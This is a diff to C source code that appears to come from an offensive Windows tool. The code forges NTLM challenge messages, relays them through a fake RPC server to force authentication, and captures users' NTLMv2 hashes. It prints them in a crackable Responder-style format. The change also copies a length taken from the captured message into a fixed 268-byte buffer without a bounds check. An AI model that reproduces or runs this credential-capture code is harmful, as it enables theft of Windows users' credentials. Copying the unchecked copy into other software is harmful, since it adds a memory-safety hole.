@@ -17,9 +17,13 @@
 #pragma warning(disable : 4996) //_CRT_SECURE_NO_WARNINGS
 
 #define DEFAULT_BUFLEN 8192
-#define NTLM_TYPE2_RESERVED_OFFSET 32
-#define NTLM_TYPE2_SERVER_CHALLENGE_OFFSET 24
-#define NTLM_TYPE3_RESPONSE_OFFSET_OFFSET 24
+
+#define NTLMv2_SERVER_CHALLENGE_LENGTH 8
+#define NTLMv2_NTPROOFSTR_LENGTH 16
+#define NTLMv2_TYPE2_RESERVED_OFFSET 32
+#define NTLMv2_TYPE2_SERVER_CHALLENGE_OFFSET 24
+#define NTLMv2_TYPE3_RESPONSE_LENGTH_OFFSET 20
+#define NTLMv2_TYPE3_RESPONSE_OFFSET_OFFSET 24
 
 extern BOOL g_SuccessTrigger;
 
@@ -54,14 +58,14 @@ void DoRpcServerCaptureCredsHash(wchar_t* rpcServerIp, wchar_t* rpcServerPort, w
 			// forge the ntlm type2 message using the win32 api
 			ForgeNtlmType2(ntlmType1, iResult - ntlmIndex, ntlmType2, &ntlmType2Len);
 			// here we zero'd out the Reserved field to force a remote authentication on localhost. If this value is not set to 0 the auth will be broken.
-			ntlmType2[NTLM_TYPE2_RESERVED_OFFSET] = 0;
-			ntlmType2[NTLM_TYPE2_RESERVED_OFFSET +1] = 0;
-			ntlmType2[NTLM_TYPE2_RESERVED_OFFSET +2] = 0;
-			ntlmType2[NTLM_TYPE2_RESERVED_OFFSET +3] = 0;
-			ntlmType2[NTLM_TYPE2_RESERVED_OFFSET +4] = 0;
-			ntlmType2[NTLM_TYPE2_RESERVED_OFFSET +5] = 0;
-			ntlmType2[NTLM_TYPE2_RESERVED_OFFSET +6] = 0;
-			ntlmType2[NTLM_TYPE2_RESERVED_OFFSET +7] = 0;
+			ntlmType2[NTLMv2_TYPE2_RESERVED_OFFSET] = 0;
+			ntlmType2[NTLMv2_TYPE2_RESERVED_OFFSET +1] = 0;
+			ntlmType2[NTLMv2_TYPE2_RESERVED_OFFSET +2] = 0;
+			ntlmType2[NTLMv2_TYPE2_RESERVED_OFFSET +3] = 0;
+			ntlmType2[NTLMv2_TYPE2_RESERVED_OFFSET +4] = 0;
+			ntlmType2[NTLMv2_TYPE2_RESERVED_OFFSET +5] = 0;
+			ntlmType2[NTLMv2_TYPE2_RESERVED_OFFSET +6] = 0;
+			ntlmType2[NTLMv2_TYPE2_RESERVED_OFFSET +7] = 0;
 			// here we communicate with our fake RPC Server to have just the template for rpc packets, sending the type1
 			if (send(RPCSocketReflect, type1BakBuffer, type1BakLen, 0) == SOCKET_ERROR) {
 				printf("[!] Couldn't communicate with the fake RPC Server\n");
@@ -170,6 +174,7 @@ void PrintCapturedHash(char *ntlmType2, char* ntlmType3) {
 	unsigned char NTProofStr[16];
 	unsigned char NTLMResponse[268];
 	int* ntlmType3Offset;
+	unsigned short* ntlmType3Length;
 
 	short* domainLen, * userLen, * hostnameLen;
 	__int32* domainOffset, * userOffset, * hostnameOffset;
@@ -190,15 +195,17 @@ void PrintCapturedHash(char *ntlmType2, char* ntlmType3) {
 	memcpy(hostname, ntlmType3 + (*hostnameOffset), *hostnameLen);
 
 	// parsing captured hash
-	memcpy(serverChallenge, &ntlmType2[NTLM_TYPE2_SERVER_CHALLENGE_OFFSET], 8);
-	ntlmType3Offset = (int*)(ntlmType3 + NTLM_TYPE3_RESPONSE_OFFSET_OFFSET);
-	memcpy(NTProofStr, &ntlmType3[*ntlmType3Offset], 16);
-	memcpy(NTLMResponse, &ntlmType3[(*ntlmType3Offset) + 16], 268);
+	memcpy(serverChallenge, &ntlmType2[NTLMv2_TYPE2_SERVER_CHALLENGE_OFFSET], NTLMv2_SERVER_CHALLENGE_LENGTH);
+	ntlmType3Length = (unsigned short*)(ntlmType3 + NTLMv2_TYPE3_RESPONSE_LENGTH_OFFSET);
+	ntlmType3Offset = (int*)(ntlmType3 + NTLMv2_TYPE3_RESPONSE_OFFSET_OFFSET);
+	memcpy(NTProofStr, &ntlmType3[*ntlmType3Offset], NTLMv2_NTPROOFSTR_LENGTH);
+	memcpy(NTLMResponse, &ntlmType3[(*ntlmType3Offset) + NTLMv2_NTPROOFSTR_LENGTH], *ntlmType3Length-NTLMv2_NTPROOFSTR_LENGTH);
 
 	if (wcslen(user) < 2) {
 		printf("[!] Couldn't capture the user credential hash :(\n");
 		return;
 	}
+
 	g_SuccessTrigger = TRUE;
 
 	// printing the golden data, format inspired by Responder :D
@@ -207,16 +214,16 @@ void PrintCapturedHash(char *ntlmType2, char* ntlmType3) {
 	printf("NTLMv2 Client\t: %S\n", hostname);
 	printf("NTLMv2 Username\t: %S\\%S\n", domain, user);
 	printf("NTLMv2 Hash\t: %S::%S:", user, domain);
-	for (int i = 0; i < 8; i++)
+	for (int i = 0; i < NTLMv2_SERVER_CHALLENGE_LENGTH; i++)
 		printf("%02x", serverChallenge[i]);
 	printf(":");
-	for (int i = 0; i < 16; i++)
+	for (int i = 0; i < NTLMv2_NTPROOFSTR_LENGTH; i++)
 		printf("%02x", NTProofStr[i]);
 	printf(":");
-	for (int i = 0; i < 268; i++)
+	for (int i = 0; i < *ntlmType3Length - NTLMv2_NTPROOFSTR_LENGTH; i++)
 		printf("%02x", NTLMResponse[i]);
 	printf("\n\n");
-	//hexDump2((char*)"\nserverChallenge\n", serverChallenge, 8);
-	//hexDump2((char*)"\nNTProofStr\n", NTProofStr, 16);
-	//hexDump2((char*)"\nNTLMResponse\n", NTLMResponse, 268);
+	//hexDump2((char*)"\nserverChallenge\n", serverChallenge, NTLMv2_SERVER_CHALLENGE_LENGTH);
+	//hexDump2((char*)"\nNTProofStr\n", NTProofStr, NTLMv2_NTPROOFSTR_LENGTH);
+	//hexDump2((char*)"\nNTLMResponse\n", NTLMResponse, *ntlmType3Length - NTLMv2_NTPROOFSTR_LENGTH);
 }
